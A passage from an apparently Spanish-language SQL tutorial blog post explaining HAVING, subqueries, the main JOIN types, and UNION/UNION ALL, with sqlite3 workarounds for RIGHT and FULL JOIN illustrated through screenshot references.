&lt;p&gt;Y que hacemos si ahora que obtuvimos el promedio queremos verlos en orden. Pues simplemente como vimos anteriormente agregaremos a nuestra consulta un &lt;code&gt;ORDER BY DESC&lt;/code&gt; y de esta manera verias los promedios ordenador de mayor a menor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query51.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que pasa si queremos usar una condición en esta consulta, donde solo nos muestre el promedio &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt; obtenido, pero solo si es mayor a 40.&lt;/p&gt;

&lt;p&gt;Entonces automaticamente uno pensaria en usar una condición &lt;code&gt;WHERE&lt;/code&gt;, pero esta nos arroja un error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query52.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seguro te preguntaras por que me esta arrojando un error si estoy estableciendo una condición correctamente?&lt;/p&gt;

&lt;p&gt;Pues esto se debe a que &lt;code&gt;WHERE&lt;/code&gt; trabaja haciendo un filtro de registros y en este caso al estar trabajando con &lt;code&gt;GROUP BY&lt;/code&gt; y con una &lt;code&gt;función de agregación&lt;/code&gt;, pasariamos a estar trabajando con grupos y por ese motivo &lt;code&gt;WHERE&lt;/code&gt; en este caso siempre nos daria un error.&lt;/p&gt;

&lt;h2 id=&quot;clausula-having&quot;&gt;CLAUSULA HAVING &lt;a href=&quot;#clausula-having&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Anteriormente mencionamos que al trabajar con &lt;code&gt;GROUP BY&lt;/code&gt;, pasariamos de tratar con registros a hacer un filtrado por grupos. Por tanto asi como &lt;code&gt;WHERE&lt;/code&gt; realiza un filtrado por registros, cuando queremos ejecutar condiciones en grupos usamos la clausula &lt;code&gt;HAVING&lt;/code&gt; que funciona exactamente igual a &lt;code&gt;WHERE&lt;/code&gt; pero cabe mencionarlo nuevamente lo usamos cuando trabajamos con grupos.&lt;/p&gt;

&lt;p&gt;Por lo tanto recordando nuestra anterior consulta donde queriamos que se nos muestre &lt;code&gt;PRECIO_PROMEDIO&lt;/code&gt;, pero solo si este era mayor a 40, nuestra consulta seria la siguiente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query53.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Veamos un nuevo ejemplo para que nos quede completamente claro. Vamos a suponer que queremos obtener cual fue el producto mas vendido del total de ventas.&lt;/p&gt;

&lt;p&gt;Para ello usaremos la tabla de los detalles de la orden &lt;code&gt;OrderDetails&lt;/code&gt;, donde seleccionaremos el campo de &lt;code&gt;ProductID&lt;/code&gt; y el de &lt;code&gt;Quantity&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query54.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues aplicaremos la función de agregación &lt;code&gt;SUM()&lt;/code&gt; para sumar las cantidades &lt;code&gt;Quantity&lt;/code&gt; y las agruparemos con &lt;code&gt;GROUP BY&lt;/code&gt; por el id del producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query55.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera obtendremos la cantidad de productos agrupados segun el id de producto &lt;code&gt;ProductID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finalmente aplicaremos un ordenamiento &lt;code&gt;ORDER BY&lt;/code&gt; por &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; de manera descendente y como solo queremos que se muestre el &lt;code&gt;ProductID&lt;/code&gt; que mas se vendio usamos un &lt;code&gt;LIMIT 1&lt;/code&gt; y obtendriamos el resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query56.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien ahora quiza te puedas preguntar por que añadimos un &lt;code&gt;ORDER BY&lt;/code&gt; y despues un &lt;code&gt;LIMIT&lt;/code&gt; si podriamos haber usado un &lt;code&gt;HAVING&lt;/code&gt; para usar una condición donde en base a &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; nos de el valor maximo empleando la función &lt;code&gt;MAX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query57.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que nos arroja un error.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Esto se debe a que no es posible ejecutar una función de agregación sobre el resultado de otra función de agregación.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Asi que esa opción estaria descartada.&lt;/p&gt;

&lt;h2 id=&quot;subconsultas&quot;&gt;SUBCONSULTAS &lt;a href=&quot;#subconsultas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Hasta ahora hemos realizado consultas basandonos en una sola tabla, pero que pasa en los casos donde necesitemos juntas campos de distintas tablas  para consultar algo concreto.
Pues en ese caso existen algunas maneras y una de ellas es utilizando las &lt;code&gt;Subconsultas&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para pode usar este concepto primero debemos entender el concepto de tablas relacionales y si queremos trabajar con datos de varias tablas a traves de una relación debemos usar los &lt;code&gt;deintificadores&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Anteriomente gracias a las consultas &lt;code&gt;GROUP BY&lt;/code&gt; y &lt;code&gt;HAVING&lt;/code&gt;, pudimos agrupar por los identificadores y encontrar el producto que fue mas vendido. Pero si nos ponemos a analizar, el hecho de saber cual producto se vendio mas, no quiere decir que fue el que mas ganancias nos dio.&lt;/p&gt;

&lt;p&gt;Y si quisieramos saber cual producto nos genero mas ingresos, en este caso tendriamos que relacionar las tablas &lt;code&gt;OrderDetails&lt;/code&gt; y &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Aqui es donde podemos usar el concepto de &lt;code&gt;Subconsultas&lt;/code&gt; que no es mas que una consulta dentro de otra consulta, es decir viene a ser una consulta que hace referencia a otra consulta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cuando realizamos una consulta esta nos devuelve un valor , y una subconsulta como vemos en la imagen es realizar una nueva consulta de ese valor.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Una cosa a tener en cuenta es que una &lt;code&gt;Subconsulta&lt;/code&gt; solo puede ser un &lt;code&gt;SELECT&lt;/code&gt; ya que esta solo nos devuelven información y no alteran a la base de datos.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a verlo de manera practica, y vamos a realizar una consulta que ademas de mostrarnos el id del producto &lt;code&gt;ProductID&lt;/code&gt;y la cantidad &lt;code&gt;Quantity&lt;/code&gt;, tambien nos muestre el nombre del producto &lt;code&gt;ProductName&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello primero seleccionaremos los campos &lt;code&gt;ProductID&lt;/code&gt; y &lt;code&gt;Quantity&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query58.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora en una consulta aparte, vamos a seleccionar el campo faltante &lt;code&gt;ProductName&lt;/code&gt; correspondiente a la tabla &lt;code&gt;Products&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query59.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esta consulta sera la que utilizaremos para realizar una subconsulta dentro de nuestra primera consulta.&lt;/p&gt;

&lt;p&gt;Para ello debemos de integrarlo en nuestra consulta principal como un campo y ponerlo entre &lt;code&gt;()&lt;/code&gt; y podemos ponerle el alias al que corresponde.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query60.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos ver que si se nos esta incluyendo el campo, pero solo se nos muestra el primer resultado repetido. Esto se debe a que al ejecutar un &lt;code&gt;SELECT&lt;/code&gt;, por cada ejecución nos esta deolviendo el primer campo, y por lo tanto dentro debemos de establecer una condición en la que comparemos que el &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; sea igual al del &lt;code&gt;ProductID&lt;/code&gt; de la tabla &lt;code&gt;Products&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query61.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos la consulta correctamente, pero ahora vemos que nos vuelve a mostrar el mismo resultado. Y esto se debe a que dentro de la &lt;code&gt;subconsulta&lt;/code&gt; no se sabe a que tabla esta haciendo referencia el &lt;code&gt;ProductID&lt;/code&gt;, por lo tanto debemos especificar que esta haciendo referencia a &lt;code&gt;OrderDetails&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query62.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera vemos que ahora si, nos muestra los resultados correctamente.&lt;/p&gt;

&lt;p&gt;Y si quiseramos adicionar mas campos, hariamos exactamente el mismo proceso solo especificando el nombres de los campos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query63.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que ya comprendimos como funcionan las subconsultas, volvamos a resolver lo anteriomente propuesto en el que habiamos obtenido el producto que se vendio en mayor cantidad, pero no el que mas ingreso nos genero.&lt;/p&gt;

&lt;p&gt;Teniamos previamente la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query65.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora debemos agregar la subconsulta que nos devuelva el precio &lt;code&gt;Price&lt;/code&gt;, podemos usar un alias para acortar el nombre de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; como &lt;code&gt;OD&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query64.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora solo nos faltaria calcular el monto total e ingreso, para ello tendriamos que multiplicar la &lt;code&gt;CANTIDAD_TOTAL&lt;/code&gt; por el &lt;code&gt;PRECIO&lt;/code&gt;, pero debido a que no podemos usar un &lt;code&gt;ALIAS&lt;/code&gt;, necesariamanete debemos insertar nuevamente la subconsulta que nos generaba el alias y de la misma manera tambien insertar la función de agregación, adicionalmente agregaremos el &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt; para verlo mas descriptivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query66.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en conclusión vemos que el producto que mas se vendio, no necesariamente corresponde al que mas ingresos nos aporto.&lt;/p&gt;

&lt;p&gt;Otra cosa acerca de las subconsultas, es que tambien las podemos usar en condicionales como un &lt;code&gt;WHERE&lt;/code&gt;, para realizar operaciones con un campo sin necesidad de mostrarlo.&lt;/p&gt;

&lt;p&gt;Para ello vamos a modificar nuestra consulta anterior y borrar el campo que correspondia a el &lt;code&gt;PRECIO&lt;/code&gt; y utilizarlo para establecer una condición donde solo nos devuelva los precios mayores a 100.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query67.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo muy intersante a mencionar es que el resultado de esta subconsulta, nos devuelve una especie de tabla virtual en la que podemos seguir trabajando. Ya que nuestra subconsulta anterior, podemo meterla dentro de un &lt;code&gt;SELECT&lt;/code&gt; y volver a trabajar desde ahi como si fuera otra tabla mas simplificado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query68.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos trabajar en ella como si fuera otra tabla, como en este caso seleccionando el campo &lt;code&gt;NOMBRE_PRODUCTO&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Intentemos realizar algo mas complejo usando subconsultas, como mostrar el total de ordenes realizadas por los clientes, siempre y cuando estas sean mayores a su promedio.&lt;/p&gt;

&lt;p&gt;Par ello primero tenemos que seleccionar el nombre &lt;code&gt;CustomerName&lt;/code&gt; de la tabla empleados &lt;code&gt;Employees&lt;/code&gt; y dentro ejecutaremos una subconsulta que nos muestre la suma de la cantidad de ordenes &lt;code&gt;SUM(Quantity)&lt;/code&gt; esto de la tabla &lt;code&gt;OrderDetails&lt;/code&gt; y de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query69.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos devolvera la &lt;code&gt;CANTIDAD_DE_ORDENES_REALIZADAS&lt;/code&gt;, pero con solo un valor muy grande referido a la cantidad total de ordenes despues de realizar una especie de multiplicación como un producto cartesiano que no es la correspondiente y para poder obtener el valor verdadero. Debemos de establecer una primera condición donde el &lt;code&gt;CustomerID&lt;/code&gt; de la tabla &lt;code&gt;Customers&lt;/code&gt; sea igual al de la tabla &lt;code&gt;Orders&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query70.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora tambien debemos validar que el id de la orden &lt;code&gt;OrderID&lt;/code&gt; de la tabla &lt;code&gt;Orders&lt;/code&gt; y &lt;code&gt;OrderDetails&lt;/code&gt; sea el mismo, y de esta manera obtendriamos la cantidad total de ordenes realizadas por nuestros clientes &lt;code&gt;Customers&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query71.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya llegados a este punto queremos que solo nos muestren los resultados que sean mayor al promedio de ordenes.&lt;/p&gt;

&lt;p&gt;Para esto tenemos que recordar lo anteriormente mencionado de que podemos efectuar subconsultas en un &lt;code&gt;WHERE&lt;/code&gt;, por ello primero buscaremos calcular el promedio del total de ordenes de el resultado de una subconsulta a la que llamaremos &lt;code&gt;CANTIDAD_TOTAL_ORDENES&lt;/code&gt; proveniente de la tabla &lt;code&gt;Customers&lt;/code&gt; al cual asignaremos como alias &lt;code&gt;C2&lt;/code&gt; para evitar problemas ya que contamos con una denombre &lt;code&gt;C1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query72.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y dentro de esa subconsulta vamos a insertar la primera subconsulta que realizamos con la cual obteniamos la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt;, solo que esta vez provendra de la tabla &lt;code&gt;Customers&lt;/code&gt; con el alias &lt;code&gt;C2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query73.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Asi con el uso de subconsultas, lograriamos obtener el resultado donde la &lt;code&gt;CANTIDAD_ORDENES_REALIZADAS&lt;/code&gt; son mayores al promedio.&lt;/p&gt;

&lt;p&gt;Con esto concluimos que podemos usar las subconsultas en ciertos casos, pero existe una forma mejor de poder realizar estas acciones y nos eviten tener un codigo tan extenso como el que generamos y estos vendrian a ser los &lt;code&gt;JOINS&lt;/code&gt; de los cuales hablaremos a continuación.&lt;/p&gt;

&lt;h2 id=&quot;joins&quot;&gt;JOINS &lt;a href=&quot;#joins&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son operaciones que realizamos para combinar los datos de dos o mas tablas de nuestra base de datos, pero que esta información se devuelva en una tabla nueva.&lt;/p&gt;

&lt;p&gt;Existen varios tipos de &lt;code&gt;JOINS&lt;/code&gt; y entre los principales tenemos cinco:&lt;/p&gt;

&lt;h2 id=&quot;cross-join&quot;&gt;CROSS JOIN &lt;a href=&quot;#cross-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Son el resultado de unir dos tablas, como si se tratase de un producto cartesiano.&lt;/p&gt;

&lt;p&gt;Supongamos tenemos dos tablas, una de &lt;code&gt;estudiantes&lt;/code&gt; y otra de &lt;code&gt;lenguajes&lt;/code&gt;, si aplicaramos un &lt;code&gt;CROSS JOIN&lt;/code&gt; daria como resultado el producto cartesiano de ambas tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Existen dos formas de definirlos, las cuales son implicita y explicita.&lt;/p&gt;

&lt;p&gt;Implicitamente cuando definimos un &lt;code&gt;CROSS JOIN&lt;/code&gt;, pero sin usar el termino &lt;code&gt;JOIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si lo aplicamos a las tablas de empleados &lt;code&gt;Employees&lt;/code&gt; y ordenes &lt;code&gt;Orders&lt;/code&gt;, nos da como resultado el producto cartesiano de ambas ya que nuestra tabla &lt;code&gt;Employees&lt;/code&gt; tiene 10 registros y &lt;code&gt;Orders&lt;/code&gt; 196, como resultado nos devuelve 1960 registro relacionados.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query74.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podemos obtener el mismo resultado si lo aplicamos de manera explicita, para ello varia un poco la sintaxis.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query75.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este tipo de join casi no se usa, pero es recomendable conocer como funciona.&lt;/p&gt;

&lt;h2 id=&quot;inner-join&quot;&gt;INNER JOIN &lt;a href=&quot;#inner-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es el resultado de la busqueda de coincidencia de dos o mas tablas en función a la columna que tengan en comun.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Supongamos tenemos dos tablas una de personas que estudian y otra de personas que trabajan, como resultado el &lt;code&gt;INNER JOIN&lt;/code&gt; nos daria unicamente las coincidencias de ambas tablas donde las personas estudian y trabajan.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para aplicarlo a nuestra tablas de empleados y ordenes, primero debemos seleccionar nuestra tabla &lt;code&gt;Employees&lt;/code&gt; y seguidamente &lt;code&gt;INNER JOIN&lt;/code&gt; con la tabla &lt;code&gt;Orders&lt;/code&gt; y finalmente para ejecutar la concidencia usaremos &lt;code&gt;ON&lt;/code&gt; especificando que queremos nos lo ejecute solo cuando el &lt;code&gt;EmployeeID&lt;/code&gt; de ambas tablas sean iguales.&lt;/p&gt;

&lt;p&gt;Esto nos dara como resultado una nueva tabla donde solo nos muestren los datos cuando coincidan los &lt;code&gt;EmployeeID&lt;/code&gt; en ambas tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query76.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para entenderlo mejor de manera practica, vamos a crearnos una tabla adicional con el nombre &lt;code&gt;Gratificacion&lt;/code&gt;, en donde haremos referencia al &lt;code&gt;EmployeeID&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query77.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora insertaremos algunos valores al azar para poder trabajar nuestro &lt;code&gt;JOIN&lt;/code&gt; con esta tabla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query78.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adicional a ello insertaremos algunos valores &lt;code&gt;NULL&lt;/code&gt;, para este caso.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query79.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nuestra tabla nos queda de la siguiente forma, donde podemos observar existen valores nulos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query80.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a proceder a realizar un &lt;code&gt;INNER JOIN&lt;/code&gt;, tomando como tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query81.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como resultado, podemos ver que solo se nos muestran las coincidencias y no los valores &lt;code&gt;NULL&lt;/code&gt; ya que estos al no coincidir con el &lt;code&gt;EmployeeID&lt;/code&gt; no los concidera.&lt;/p&gt;

&lt;h2 id=&quot;left-join&quot;&gt;LEFT JOIN &lt;a href=&quot;#left-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;En el &lt;code&gt;LEFT JOIN&lt;/code&gt; se toma como prioritaria a toda la tabla de la izquierda y solo una parte de la tabla derecha, concretamente solo si existe alguna coincidencia.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usemos el mismo caso donde tenemos dos tablas de personas que estudian y otra de personas que trabajan, si aplicamos un &lt;code&gt;LEFT JOIN&lt;/code&gt;, como resultado tendriamos todos los datos de la tabla &lt;code&gt;personas que estudian&lt;/code&gt; con sus coincidencias y de no existir alguna se completaria con valores &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora lo vemos de manera practica y usamos en nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, es muy simple ya que solo debemos cambiar la palabra inner por &lt;code&gt;LEFT&lt;/code&gt; y igualmente para establecer la comparacion usamos &lt;code&gt;ON&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query82.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El resultado de la consulta nos muestra todos los valores de la tabla &lt;code&gt;Employees&lt;/code&gt; y de la tabla &lt;code&gt;Gratificacion&lt;/code&gt; solo los valores donde exista coindencias, y en las que no existan nos las completa con valores nulos.&lt;/p&gt;

&lt;h2 id=&quot;right-join&quot;&gt;RIGHT JOIN &lt;a href=&quot;#right-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Similar al left join cuando usamos &lt;code&gt;RIGHT JOIN&lt;/code&gt;, se toman todos los datos de la tabla derecha y solo parte de la izquierda.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De la misma manera con nuestras tablas de persona que estudian y trabajan, al aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; tendriamos como resultado todos los valores de la tabla derecha &lt;code&gt;personas que trabajan&lt;/code&gt; y de no existir coincidencias de igual modo se completarian con datos de tipo &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aplicandolo nuevamente a nuestras tablas &lt;code&gt;Employees&lt;/code&gt; y &lt;code&gt;Gratificacion&lt;/code&gt;, seria muy parecido a lo anterior, solo que en este caso particular, &lt;code&gt;sqlite3&lt;/code&gt; no admite la función &lt;code&gt;RIGHT JOIN&lt;/code&gt;, ya que si la tratamos de ejecutar nos genera un error.&lt;/p&gt;

&lt;p&gt;Aunque en otros tipos de gestores esta opción si es valida, hay un manera logica y facil de solucionar esto en &lt;code&gt;sqlite3&lt;/code&gt; y es tan sencillo como aplicar un &lt;code&gt;LEFT JOIN&lt;/code&gt;, pero cambiar el orden de las tablas y de esa manera es como si ejecutaramos un &lt;code&gt;RIGHT JOIN&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query83.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y asi de una forma simple logramos aplicar un &lt;code&gt;RIGHT JOIN&lt;/code&gt; que vendria mas o menos a ser un &lt;code&gt;LEFT JOIN&lt;/code&gt; inverso .&lt;/p&gt;

&lt;h2 id=&quot;full-join&quot;&gt;FULL JOIN &lt;a href=&quot;#full-join&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;A diferencia que el left y right join, cuando aplicamos un &lt;code&gt;FULL JOIN&lt;/code&gt; nos devuelve todo, es decir la suma de las tablas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/img4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es la union de todas las tablas, al aplicar un &lt;code&gt;FULL JOIN&lt;/code&gt;, nos devuelve todos los valores de ambas tablas y no de existir coindencias entre algunos campos, de la misma manera nos los muestra con valores nulos &lt;code&gt;NULL&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder aplicarlo en &lt;code&gt;sqlite3&lt;/code&gt; de manera practica, tambien tenemos un problema puesto que tampo acepta la ejecución de &lt;code&gt;FULL JOIN&lt;/code&gt;, pero para ello podemos usar una clausula
que nos permita unir tanto el &lt;code&gt;LEFT JOIN&lt;/code&gt; como el &lt;code&gt;RIGTH JOIN&lt;/code&gt; y esta tiene por nombre  &lt;code&gt;UNION&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;clausula-union&quot;&gt;CLAUSULA UNION &lt;a href=&quot;#clausula-union&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La clausula &lt;code&gt;UNION&lt;/code&gt; la utilizamos para combinar el resultado de dos o mas consultas en un solo conjunto de datos.&lt;/p&gt;

&lt;p&gt;Para poder usar esta clausula se deben tener la misma cantidad de columnas y los tipos de datos deben de ser compatibles.&lt;/p&gt;

&lt;p&gt;Lo que hace concretamente &lt;code&gt;UNION&lt;/code&gt; es la devolvernos una unica tabla que contenga las filas combinadas de las tablas, eliminando las duplicadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora ejecutamos un &lt;code&gt;LEFT JOIN&lt;/code&gt; y un &lt;code&gt;RIGHT JOIN&lt;/code&gt;, al unir ambas consultas con un &lt;code&gt;UNION&lt;/code&gt; obtendremos como resultado un &lt;code&gt;FULL JOIN&lt;/code&gt; simulado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/query84.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;clausula-union-all&quot;&gt;CLAUSULA UNION ALL &lt;a href=&quot;#clausula-union-all&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;A diferencia que al usar union, cuando usamos la clausula &lt;code&gt;UNION ALL&lt;/code&gt;, de la combinación de las filas no se eliminan las que son duplicadas y tampoco se realiza una verificación de la compatibilidad de datos.&lt;/p&gt;

